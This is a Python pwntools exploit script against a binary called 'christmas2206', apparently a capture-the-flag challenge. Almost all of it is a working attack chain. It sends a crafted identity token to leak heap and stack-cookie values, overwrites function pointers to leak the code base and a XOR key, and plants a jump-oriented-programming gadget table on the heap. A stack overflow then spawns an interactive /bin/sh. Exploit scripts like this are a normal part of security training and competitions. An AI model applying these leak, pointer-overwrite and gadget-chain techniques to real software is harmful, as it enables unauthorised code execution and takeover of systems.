#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
from binascii import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
context.terminal = ['tmux', 'split', '-h']

exe = context.binary = ELF('christmas2206')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())
# -- Exploit goes here --

log.info("Attacking the target...")
for i in range(1):
    log.info("Attempt {}/100".format(i + 1))
    io = start()
    try:
        # login
        payload = hexlify(b"A"*65+b"B"*59+b"idtok:12345|key:CCCC")
        log.info("Crated identity token")
        _snd("a")
        _sndla("Identity token:", payload)

        # leak the heap and the cookie
        _rcvu('Your private key: 43434343')
        heap, cookie = _rcvn(8 * 2), _rcvn(8 * 2)
        heap = unpack(unhexlify(heap))
        cookie = unpack(unhexlify(cookie))
        log.success("Leaked heap base address: {}".format(hex(heap)))
        log.success("Leaked stack cookie: {}".format(hex(cookie)))

        # change print_info pointer to debug_print in order to leak code base
        log.info("Trying to guess offset of 'debug_print()'")
        _sndla(">", "change")
        _sndla(":", "41" * 34 + "a95f") # this should be bruteforced
        _sndla(">", "show")
        _rcvu("DEBUG ")
        log.success("The guess was succesful. Function pointer was overwritten.")
        code = int(_rcvu(':').replace(':', ''), 16) - 0x5620
        log.success("Leaked code base address: {}".format(hex(code)))

        # change print_info pointer to stackshield_get_old_rip in order to leak XOR key
        to_send = hex(code + 0x11d0)[-2:] + hex(code + 0x11d0)[-4:-2]
        print (to_send)
        log.info("Overwrite function pointer with 'stackshield_get_old_rip()' address ({}) in order to leak the secret XOR key".format(hex(code + 0x11d0)))
        _sndla(">", "change")
        _sndla(":", "41" * 34 + to_send)
        _snda('>', "show")
        _snda('>', "A" * 8 * 4)
        _rcvu('Command ')
        _rcvn(8 * 4)
        key = unpack(_rcvn(8))
        log.success("Leaked the XOR key: {}".format(hex(key)))

        # prepare JOP table onto the heap
        log.info("Crating the JOP table...")
        _sndla(">", "design")
        _snda(":", "D" * 10)
        # 0000000000000026d7:   mov     rsi, [rbx+8]; call    rax ; loc_0
        # 0x000000000000211e: mov rdi, rsi; call rax;
        # 0x0000000000002721: mov rax, dword ptr [rbx + 8]; syscall;
        load_rsi   = 0x26d7
        syscall    = 0x2721
        rsi_to_rdi = 0x211e

        my_chunk = heap + 0xad70
        payload = "A" * 54 + p64(my_chunk + 5) + "B" * 0x18 + p64(code + load_rsi) + "A" * 0x58 + p64(code + rsi_to_rdi) + "B" * 0x38 + p64(0x0) + "A" * 0x18 + p64(code + load_rsi) + "B" * 56 + p64(0x3b) + "A" * 24 + p64(code + syscall)
        xored = ""
        for i, c in enumerate(payload):
            xored += chr(ord('A') ^ ord(c))
        payload = xored
        _snda(":", payload)
        # 0x00000000000022e4: add rbx, 0x60; call qword ptr [rbx + 0x28];
        dispatch = 0x22e4
        #log.info(hex(code + dispatch))
        dispatcher = pack(code + dispatch)

        # overflow in report(), overwrite function pointer from dashboard()
        log.info("Triggering the exploit...")
        _snda(">", "report")
        rdi = pack(my_chunk)
        rsi = pack(my_chunk + 1000)
        function_pointer = dispatcher
        temp_ret = pack(0xcafebabe)
        _snda(":", ("A" * 0x48 + pack(cookie) + pack(0xbadffff) + rdi + rsi + pack((code + 0x23ef) ^ key) + temp_ret + function_pointer))
        _snda(">", "quit\x00/bin/sh\x00")
        _sndl('uname -a')
        io.success("Spawned shell :D")
        io.interactive()
        io.close()
        break
    except:
        log.warn("Exploit failed")
        if args.GDB:
            io.interactive()
        else:
            io.close()

